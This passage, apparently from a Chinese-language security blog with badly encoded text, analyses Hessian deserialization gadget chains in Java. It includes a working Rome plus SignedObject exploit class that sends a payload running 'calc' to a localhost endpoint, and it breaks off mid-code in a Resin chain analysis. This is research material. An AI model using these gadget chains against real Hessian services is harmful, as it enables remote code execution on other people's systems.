ç­‰ï¼‰ï¼Œä½†æ’é™¤ Object æœ¬èº«</span></span><br><span class="line">            <span class="keyword">if</span> (field.getType().isPrimitive()</span><br><span class="line">                    || (field.getType().getName().startsWith(<span class="string">&quot;java.lang.&quot;</span>)</span><br><span class="line">                    &amp;&amp; !field.getType().equals(Object.class))) &#123;</span><br><span class="line">                primitiveFields.add(field);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 2) å…¶ä½™å‡è§†ä¸ºå¤åˆç±»å‹ï¼ˆè‡ªå®šä¹‰ç±»ã€é›†åˆã€æ•°ç»„ç­‰ï¼‰</span></span><br><span class="line">                compoundFields.add(field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆå¹¶é¡ºåºï¼šå…ˆç®€å•ç±»å‹åå¤åˆç±»å‹</span></span><br><span class="line">    ArrayList&lt;Field&gt; fields = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Field&gt;();</span><br><span class="line">    fields.addAll(primitiveFields);</span><br><span class="line">    fields.addAll(compoundFields);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¼“å­˜å­—æ®µæ•°ç»„</span></span><br><span class="line">    _fields = <span class="keyword">new</span> <span class="title class_">Field</span>[fields.size()];</span><br><span class="line">    fields.toArray(_fields);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸ºæ¯ä¸ªå­—æ®µå‡†å¤‡å¯¹åº”çš„ FieldSerializer</span></span><br><span class="line">    _fieldSerializers = <span class="keyword">new</span> <span class="title class_">FieldSerializer</span>[_fields.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; _fields.length; i++) &#123;</span><br><span class="line">        _fieldSerializers[i] = getFieldSerializer(_fields[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Map-ååºåˆ—åŒ–"><a href="#Map-ååºåˆ—åŒ–" class="headerlink" title="Map ååºåˆ—åŒ–"></a>Map ååºåˆ—åŒ–</h2><p>ç”±ä¸Šåˆ†æï¼Œæˆ‘ä»¬å¯å¾— Hessian ååºåˆ—åŒ–æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š</p>
<ul>
<li><p>åªè¦å¼€å¯ <code>_isAllowNonSerializable</code>ï¼Œæœªå®ç° <code>Serializable</code> æ¥å£çš„ç±»ä¹Ÿèƒ½åºåˆ—åŒ–ã€‚</p>
</li>
<li><p>å’ŒåŸç”Ÿååºåˆ—åŒ–ä¸€æ ·ï¼Œ<code>static</code> å’Œ <code>transient</code> ä¿®é¥°çš„ç±»ä¸ä¼šè¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p>
</li>
<li><p>source ç‚¹ä¸åœ¨ <code>readObject</code>ï¼Œè€Œæ˜¯åˆ©ç”¨ <code>Map</code> ç±»ååºåˆ—åŒ–æ—¶ä¼šæ‰§è¡Œ <code>put</code> æ“ä½œï¼Œè§¦å‘ï¼š</p>
<ul>
<li><code>HashMap-&gt;key.hashCode()</code>ã€<code>HashMap-&gt;key.equals(k)</code></li>
<li><code>TreeMap-&gt;key.compareTo()</code></li>
</ul>
</li>
</ul>
<p>è‹¥ç›®æ ‡ RPC æœåŠ¡æš´éœ²å‡ºå»çš„æ¥å£æ–¹æ³•ä¸æ¥æ”¶ <code>Map</code> ç±»å‹å‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾è¿œç¨‹å¯¹è±¡ä» <code>HessianServlet</code> åŠå…¶çˆ¶ç±»ç»§æ‰¿å¾—åˆ°çš„æ–¹æ³•ã€‚</p>
<p>å› ä¸ºé€šå¸¸æ¥è¯´æœåŠ¡ç«¯ç±»ä¼š<strong>ç»§æ‰¿</strong> <code>HessianServlet</code>ã€‚åœ¨ <code>HessianServlet#init</code> å‡½æ•°ä¸­ï¼Œ<strong>å¦‚æœæ²¡æœ‰æ˜¾å¼é…ç½® <code>home-api</code>ï¼ˆæˆ– <code>api-class</code>ï¼‰</strong>ï¼ŒHessian ä¼šæŠŠ <code>_homeAPI</code> <strong>å›é€€</strong>æˆ <code>_homeImpl.getClass()</code>ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (_homeImpl != <span class="literal">null</span>) &#123;</span><br><span class="line">    _homeAPI = findRemoteAPI(_homeImpl.getClass());</span><br><span class="line">    <span class="keyword">if</span> (_homeAPI == <span class="literal">null</span>)</span><br><span class="line">    _homeAPI = _homeImpl.getClass();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ³¨æ„ï¼šæœ€ç»ˆåˆå¼ºåˆ¶èµ‹å€¼æˆå®ç°ç±»</span></span><br><span class="line">    _homeAPI = _homeImpl.getClass();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼š<strong>å¯¹å¤–æš´éœ²çš„ API ç±»å‹ &#x3D; ä½ çš„å®ç°ç±»æœ¬èº«</strong>ï¼ˆè€Œä¸æ˜¯ä½ åŸæœ¬è®¾è®¡çš„å°æ¥å£ï¼‰ã€‚</p>
<p>éšå <code>AbstractSkeleton(apiClass)</code> ä¼šå¯¹è¿™ä¸ª <code>apiClass.getMethods()</code> é‡Œçš„<strong>æ‰€æœ‰ public æ–¹æ³•</strong>å»ºç´¢å¼•ï¼ˆåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿æ¥çš„ï¼‰ã€‚</p>
<p>è€Œ <code>HessianServlet</code> æœ¬èº«å°±æœ‰è¿™äº› <strong>public</strong> æ–¹æ³•ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHome</span><span class="params">(Object home)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setObject</span><span class="params">(Object object)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHomeAPI</span><span class="params">(Class&lt;?&gt; api)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setObjectAPI</span><span class="params">(Class&lt;?&gt; api)</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>äºæ˜¯ï¼Œè¿™äº›æ–¹æ³•ä¹Ÿä¼šè¢«åŠ å…¥å¯è¿œç¨‹è°ƒç”¨çš„æ–¹æ³•è¡¨ï¼ˆ<code>_methodMap</code>ï¼‰ã€‚</p>
<p><strong>å®¢æˆ·ç«¯åªè¦åœ¨è‡ªå·±çš„â€œæ¥å£â€é‡ŒæŠŠè¿™äº›æ–¹æ³•å£°æ˜ä¸Š</strong>ï¼ŒHessian å®¢æˆ·ç«¯å°±ä¼šæŒ‰å®ƒä»¬çš„åå­—ä¸å‚æ•°ä¸ªæ•°ç¼–ç å‡ºè¯·æ±‚ï¼ŒæœåŠ¡ç«¯ Skeleton æ­£å¥½èƒ½åŒ¹é…ä¸Šå¹¶åå°„è°ƒç”¨å®ƒä»¬ã€‚</p>
<p>Hessian å¯ä»¥é…åˆä»¥ä¸‹æ¥åˆ©ç”¨ï¼š</p>
<ul>
<li><code>Rome</code> â† <code>hashCode</code></li>
<li><code>XBean</code> â† <code>equals</code></li>
<li><code>Resin</code> â† <code>equals</code></li>
<li><code>Goovy</code> â† <code>compareTo</code></li>
<li><code>SpringPartiallyComparableAdvisorHolder</code> â† <code>equals</code></li>
<li><code>SpringAbstractBeanFactoryPointcutAdvisor</code> â† <code>equals</code></li>
</ul>
<h3 id="ROME-SignedObject"><a href="#ROME-SignedObject" class="headerlink" title="ROME + SignedObject"></a>ROME + SignedObject</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader.defineClass(TemplatesImpl.java:142)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.defineTransletClasses(TemplatesImpl.java:346)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:383)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:418)</span><br><span class="line">at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties(TemplatesImpl.java:439)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:483)</span><br><span class="line">at com.sun.syndication.feed.impl.ToStringBean.toString(ToStringBean.java:137)</span><br><span class="line">at com.sun.syndication.feed.impl.ToStringBean.toString(ToStringBean.java:116)</span><br><span class="line">at com.sun.syndication.feed.impl.EqualsBean.beanHashCode(EqualsBean.java:193)</span><br><span class="line">at com.sun.syndication.feed.impl.EqualsBean.hashCode(EqualsBean.java:176)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:338)</span><br><span class="line">at java.util.HashMap.put(HashMap.java:611)</span><br><span class="line">at java.util.HashSet.readObject(HashSet.java:334)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:483)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1017)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1896)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1801)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1351)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:371)</span><br><span class="line">at java.security.SignedObject.getObject(SignedObject.java:180)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:483)</span><br><span class="line">at com.sun.syndication.feed.impl.ToStringBean.toString(ToStringBean.java:137)</span><br><span class="line">at com.sun.syndication.feed.impl.ToStringBean.toString(ToStringBean.java:116)</span><br><span class="line">at com.sun.syndication.feed.impl.EqualsBean.beanHashCode(EqualsBean.java:193)</span><br><span class="line">at com.sun.syndication.feed.impl.EqualsBean.hashCode(EqualsBean.java:176)</span><br><span class="line">at java.util.HashMap.hash(HashMap.java:338)</span><br><span class="line">at java.util.HashMap.put(HashMap.java:611)</span><br><span class="line">at java.util.HashSet.add(HashSet.java:219)</span><br><span class="line">at com.caucho.hessian.io.CollectionDeserializer.readList(CollectionDeserializer.java:78)</span><br><span class="line">at com.caucho.hessian.io.SerializerFactory.readList(SerializerFactory.java:557)</span><br><span class="line">at com.caucho.hessian.io.HessianInput.readObject(HessianInput.java:1154)</span><br><span class="line">at com.caucho.hessian.io.HessianInput.readObject(HessianInput.java:1012)</span><br><span class="line">at com.caucho.hessian.server.HessianSkeleton.invoke(HessianSkeleton.java:296)</span><br><span class="line">at com.caucho.hessian.server.HessianSkeleton.invoke(HessianSkeleton.java:198)</span><br><span class="line">at com.caucho.hessian.server.HessianServlet.invoke(HessianServlet.java:428)</span><br><span class="line">at com.caucho.hessian.server.HessianServlet.service(HessianServlet.java:408)</span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æ-8"><a href="#åŸç†åˆ†æ-8" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h4><p>Rome åˆ©ç”¨é“¾ä¸­çš„ <code>TemplatesImpl</code> ç”±äºå…¶ <code>_tfactory</code> è¢« <code>transient</code> ä¿®é¥°ï¼Œåœ¨ Hessian ä¸­æ— æ³•è¿›è¡Œåºåˆ—åŒ–ã€‚</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>TemplatesImpl</code> é‡å†™äº† <code>readObject</code> æ–¹æ³•ï¼Œåœ¨ <code>readObject</code> ä¸­ç»™ <code>_tfactory</code> èµ‹å€¼äº†ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">TransformerFactoryImpl</span> <span class="variable">_tfactory</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span>  <span class="title function_">readObject</span><span class="params">(ObjectInputStream is)</span></span><br><span class="line">  <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">SecurityManager</span> <span class="variable">security</span> <span class="operator">=</span> System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (security != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> SecuritySupport.getSystemProperty(DESERIALIZE_TRANSLET);</span><br><span class="line">        <span class="keyword">if</span> (temp == <span class="literal">null</span> || !(temp.length()==<span class="number">0</span> || temp.equalsIgnoreCase(<span class="string">&quot;true&quot;</span>))) &#123;</span><br><span class="line">            <span class="type">ErrorMsg</span> <span class="variable">err</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ErrorMsg</span>(ErrorMsg.DESERIALIZE_TRANSLET_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnsupportedOperationException</span>(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    is.defaultReadObject();</span><br><span class="line">    <span class="keyword">if</span> (is.readBoolean()) &#123;</span><br><span class="line">        _uriResolver = (URIResolver) is.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _tfactory = <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>(); <span class="comment">// ğŸ‘ˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è€Œ Hessian ä¸­åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸­éƒ½ä¸ä¼šå¤„ç† <code>transient</code> ä¿®é¥°çš„å­—æ®µã€‚è€Œ <code>TemplatesImpl</code>é‚£æ¡é“¾çš„ <code>defineTransletClasses</code> è¦æ±‚ <code>_tfactory</code> ä¸ä¸ºç©ºï¼Œå¦åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>å› æ­¤è¿™é‡Œéœ€è¦é…åˆ <code>java.security.SignedObject#getObject</code> è¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ–ã€‚è€Œ <code>SignedObject#getObject</code> å¯ä»¥é€šè¿‡ <code>ROME</code> é“¾è¿›è¡Œ getter è§¦å‘ã€‚</p>
<h4 id="åˆ©ç”¨ä»£ç -9"><a href="#åˆ©ç”¨ä»£ç -9" class="headerlink" title="åˆ©ç”¨ä»£ç "></a>åˆ©ç”¨ä»£ç </h4><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HessianROME</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObject</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(<span class="string">&quot;foo&quot;</span>, privateKey, signingEngine);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">innerBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">outerBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class, innerBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">triggerSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        triggerSet.add(outerBean);</span><br><span class="line"></span><br><span class="line">        setFieldValue(signedObject, <span class="string">&quot;content&quot;</span>, ROME.getPayload(cmd));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> triggerSet;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HessianProxyFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianProxyFactory</span>();</span><br><span class="line">        <span class="type">HelloService</span> <span class="variable">hello</span> <span class="operator">=</span> (HelloService) factory.create(</span><br><span class="line">                HelloService.class, <span class="string">&quot;http://localhost:8080/hessian/hello&quot;</span>);</span><br><span class="line">        hello.setObject(getObject(<span class="string">&quot;calc&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> object.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(object, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Resin"><a href="#Resin" class="headerlink" title="Resin"></a>Resin</h3><div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.caucho<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>resin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.64<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<h4 id="åŸç†åˆ†æ-9"><a href="#åŸç†åˆ†æ-9" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h4><p><code>com.sun.org.apache.xpath.internal.objects.XString#equals</code> ä¼šå¯¹ä¼ å…¥çš„ <code>obj2</code> è°ƒç”¨ <code>toString</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj2)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj2 == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (obj2 <span class="keyword">instanceof</span> XNodeSet)</span><br><span class="line">        <span class="keyword">return</span> obj2.equals(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (obj2 <span class="keyword">instanceof</span> XNumber)</span><br><span class="line">        <span class="keyword">return</span> obj2.equals(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> str().equals(obj2.toString()); <span class="comment">// ğŸ‘ˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>com.caucho.naming.QName</code> æ˜¯ Resin å¯¹ä¸Šä¸‹æ–‡ <code>_context</code> çš„ä¸€ç§å°è£…ï¼Œå®ƒçš„ <code>toString</code> æ–¹æ³•ä¼šè°ƒç”¨å…¶å°è£…ç±»çš„ <code>composeName</code> æ–¹æ³•è·å–å¤åˆä¸Šä¸‹æ–‡çš„åç§°ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Context _context;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">QName</span><span class="params">(Context context, String first, String rest)</span> &#123;</span><br><span class="line">    _context = context;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (first != <span class="literal">null</span>)</span><br><span class="line">        _items.add(first);</span><br><span class="line">    <span class="keyword">if</span> (rest != <span class="literal">null</span>)</span><br><span class="line">        _items.add(rest);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;<span class="keyword">return</span> _items.size();&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">get</span><span class="params">(<span class="type">int</span> pos)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (pos &lt; _items.size())</span><br><span class="line">        <span class="keyword">return</span> (String) _items.get(pos);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size(); i++) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) get(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (name != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                name = _context.composeName(str, name); <span class="comment">// ğŸ‘ˆ</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">                name = name + <span class="string">&quot;/&quot;</span> + str;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span 